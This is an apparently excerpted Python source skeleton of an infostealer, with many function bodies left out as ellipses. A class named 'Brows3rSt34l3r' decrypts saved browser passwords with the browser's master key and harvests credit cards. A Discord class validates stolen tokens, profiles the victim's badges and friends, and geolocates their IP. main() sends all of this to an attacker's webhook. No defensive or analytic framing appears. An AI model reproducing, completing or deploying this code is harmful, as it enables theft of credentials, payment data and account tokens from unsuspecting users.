...
random_string = Utils.get_random_string(8)
...
class Brows3rSt34l3r:
    ...
    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = Brows3rSt34l3r.generate_cipher(master_key, iv)
            decrypted_pass = Brows3rSt34l3r.decrypt_payload(cipher, payload)
    ...
    def get_password(browser_path, i):
        master_key = Brows3rSt34l3r.get_master_key(browser_path)
        ...
        try:
            ...
            for r in cursor.fetchall():
                ...
                decrypted_password = Brows3rSt34l3r.decrypt_password(encrypted_password, master_key)
    ...
    def get_files():
        ...
        for path in browsers:
            i += 1
            Brows3rSt34l3r.get_password(path, i)
            Brows3rSt34l3r.get_credit_cards(path, i)
...
class Discord:
    ...
    def check_tokens(tokens, webhook):
        for token in tokens:
            ...
            if check.status_code == 200:
                ...
                badges = ' '.join([flag[0] for flag in Discord.calc_flags(user['public_flags'])])
                ...
                if friends:
                    ...
                    for friend in friends:
                        ...
                        inds = [flag[1] for flag in Discord.calc_flags(
                            friend['user']['public_flags'])[::-1]]
                        for flag in unprefered_flags:
                            inds.remove(flag) if flag in inds else None
                        if inds != []:
                            hq_badges = ' '.join([flag[0] for flag in Discord.calc_flags(friend['user']['public_flags'])[::-1]])
    ...
    def system_info(webhook):
        ...
        country, region, city, zip_, as_ = Utils.geolocation(ip)
...
def main():
    ...
    if PASSWORD_STEALER:
        ...
        Webhook.add_embed(VaultEmbed)

    # Discord
    Discord.check_tokens(checked, Webhook)
    if SYSTEM_INFO:
        Discord.system_info(Webhook)
